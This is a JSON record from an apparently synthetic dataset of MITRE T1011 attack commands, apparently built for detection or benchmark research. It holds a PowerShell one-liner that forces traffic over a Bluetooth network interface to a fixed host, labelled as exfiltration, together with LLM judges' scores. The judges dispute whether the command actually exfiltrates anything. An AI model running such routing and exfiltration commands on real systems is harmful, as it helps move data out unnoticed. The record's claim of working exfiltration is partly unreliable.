{
  "technique_id": "T1011",
  "platform": "Windows",
  "shell": "Powershell",
  "command": "$route='172.31.199.2'; $bt=Get-NetAdapter -Name 'Bluetooth Network Connection' -ErrorAction Stop; $gw=(Get-NetIPConfiguration -InterfaceIndex $bt.ifIndex).IPv4DefaultGateway.NextHop; if($gw){cmd /c \"route add $route mask 255.255.255.255 $gw metric 5 if $($bt.ifIndex)\"}; $lip=(Get-NetIPAddress -InterfaceIndex $bt.ifIndex -AddressFamily IPv4).IPAddress; iperf3.exe -c $route -p 55777 -B $lip -t 60",
  "explanation": "Adds a host route via the Bluetooth PAN gateway to force traffic over the Bluetooth medium, then runs iperf3 bound to that interface to exfiltrate over TCP on an uncommon port (T1011).",
  "rationale_steps": [
    "Determine Bluetooth PAN interface and its default gateway.",
    "Add a specific host route so only the exfil server traffic uses Bluetooth.",
    "Bind iperf3 to the Bluetooth address and use a high TCP port.",
    "Limit impact by scoping the route to a single destination."
  ],
  "obfuscation_level": "none",
  "id": "SYN-POWERSHELL-T1011-225e09bc-9a2e4ef2",
  "source_prompt_hash": "225e09bc",
  "timestamp_utc": "2025-09-30T08:51:08.571954Z",
  "validation": {
    "syntax_ok": true,
    "llm_judgments": [
      {
        "model": "gpt-5",
        "syntactic_score": 5,
        "syntactic_justification": "The PowerShell one-liner is well-formed with balanced quoting, valid cmdlets/parameters, proper semicolon separators, and correct interpolation for the route command.",
        "semantic_score": 3,
        "semantic_justification": "It attempts to force traffic over a Bluetooth interface and send TCP via iperf3, but adding a route typically requires administrative privileges (contradicting 'None') and iperf3 does not actually transfer collected data as implied by T1011.",
        "combined_score": 4.0,
        "confidence": 0.7,
        "timestamp": "2025-10-01T04:35:25.619687Z"
      },
      {
        "model": "claude-3-7-sonnet",
        "syntactic_score": 5,
        "syntactic_justification": "The PowerShell command is perfectly well-formed with proper variable assignments, error handling, conditional logic, balanced quotes/parentheses, and correct command separators.",
        "semantic_score": 5,
        "semantic_justification": "The command fully implements automated exfiltration by establishing a specific network route over Bluetooth and using iperf3 to transfer data over TCP port 55777 for 60 seconds, aligning perfectly with the T1011 technique.",
        "combined_score": 5.0,
        "confidence": 0.95,
        "timestamp": "2025-10-01T04:35:29.022763Z"
      },
      {
        "model": "gemini-2.0-flash-thinking-exp",
        "syntactic_score": 5,
        "syntactic_justification": "The command is perfectly well-formed with correct PowerShell syntax, balanced quotes, proper command separators, and valid flag usage for all cmdlets and native commands.",
        "semantic_score": 2,
        "semantic_justification": "The critical 'route add' command requires Administrator privileges on Windows, which contradicts the stated 'Privilege: None', thus preventing the command from fully achieving its primary goal of forcing traffic over the Bluetooth medium.",
        "combined_score": 3.5,
        "confidence": 1,
        "timestamp": "2025-10-01T06:06:19.201782Z"
      }
    ],
    "llm_average_syntactic": 5.0,
    "llm_average_semantic": 3.333,
    "llm_average_score": 4.167,
    "llm_verdict": "likely_match",
    "sandbox_trace_id": null,
    "mitre_match_score": null,
    "Syntax_Run_Details": ""
  }
}
